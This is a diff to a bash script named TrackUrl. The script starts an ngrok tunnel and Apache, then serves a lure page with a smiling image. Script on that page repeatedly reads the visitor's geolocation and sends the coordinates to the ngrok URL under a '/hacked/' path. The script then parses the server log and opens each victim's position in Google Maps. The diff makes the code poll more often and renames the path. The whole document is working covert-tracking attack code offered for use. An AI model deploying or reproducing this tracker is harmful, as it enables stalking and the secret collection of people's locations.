@@ -1,6 +1,6 @@
 #!/bin/bash
 
-Colors
+#Colors
 white="\033[1;37m"
 grey="\033[0;37m"
 purple="\033[0;35m"
@@ -28,6 +28,8 @@ function logo(){
   echo
 }
 
+logo
+
 # Windows and Resolution
 function autoResolution {
 	nx=4
@@ -46,14 +48,13 @@ function autoResolution {
 	MIDDLELEFT="-geometry  100x14+0+$screenheight"
 	MIDDLERIGHT="-geometry 100x14-0+$screenheight"
 }
+
 autoResolution
 
-xterm $TOPLEFT -T NGROK -e ngrok http 80 -log ngrok.log & clear
-
-logo
+xterm $TOPLEFT -T NGROK -e ngrok http 8080 -log ngrok.log &
 
 sleep 5
-echo -e $blue"[+] Geting Url from ngrok log!"$default
+echo -e $blue"[+] Geting Url from ngrok log file!"$default
 varurl=$(grep url=https ngrok.log | awk '{print $8}' | cut -d "=" -f2)
 echo -e $red"[+] "$varurl
 echo -e $blue"Done!!!"
@@ -65,7 +66,7 @@ echo "<!DOCTYPE html>
       <style type=\"text/css\">
          body {
          background-image: url(\"smile.jpg\");
-         background-size: 1000px 1600px;
+         background-size: 1000px 1000px;
          background-repeat: no-repeat;
          }
       </style>
@@ -82,10 +83,10 @@ echo "<!DOCTYPE html>
          function autoUpdate() {
            navigator.geolocation.getCurrentPosition(function(position) {
              coords = position.coords.latitude + \",\" + position.coords.longitude;
-              url = \""$varurl"/logme/\" + coords;
+              url = \""$varurl"/hacked/\" + coords;
              httpGet(url);
              console.log('should be working');
-             setTimeout(autoUpdate, 7000);
+             setTimeout(autoUpdate, 3000);
          })
          };
          autoUpdate();
@@ -95,29 +96,33 @@ echo "<!DOCTYPE html>
 
 mv index.html /var/www/html/index.html
 cp smile.jpg /var/www/html/smile.jpg
-service apache2 start
+sudo service apache2 start
 logo > /var/log/apache2/access.log
 xterm $TOPRIGHT -T TAIL -e tail -f /var/log/apache2/access.log &
 
-matchstr=$(awk '/./{line=$0} END{print line}' /var/log/apache2/access.log)
-if echo $matchstr | grep -q "logme"; then
-  latlong=$(awk '/./{line=$0} END{print line}' /var/log/apache2/access.log | awk '{print $7}' | cut -c 8- )
-  gcmd="https://www.google.com/maps/?q="$latlong
-  xdg-open $gcmd
-fi
+function showLatLong(){
+  matchstr=$(awk '/./{line=$0} END{print line}' /var/log/apache2/access.log)
+  if echo $matchstr | grep -q "hacked"; then
+    latlong=$(awk '/./{line=$0} END{print line}' /var/log/apache2/access.log | awk '{print $7}' | cut -c 9- )
+    gcmd="https://www.google.com/maps/?q="$latlong
+    #xdg-open $gcmd
+    firefox $gcmd
+  fi
+}
 
 while true; do
-  echo -ne $yellow"[*] Do you want to finnish? "$default
+  echo -ne $yellow"[*] (y) finnish (any) location? "$default
   read WISH
 
   if [ $WISH = "y" ]; then
     sudo killall xterm
-    service apache2 stop
+    sudo service apache2 stop
     rm ngrok.log
     echo -e $red"[+] Clean up successful..."
     echo -e $red"[+] Thank you for using TrackUrl, Good Bye..."
     exit
+  else
+    showLatLong
   fi
 done
 exit
-
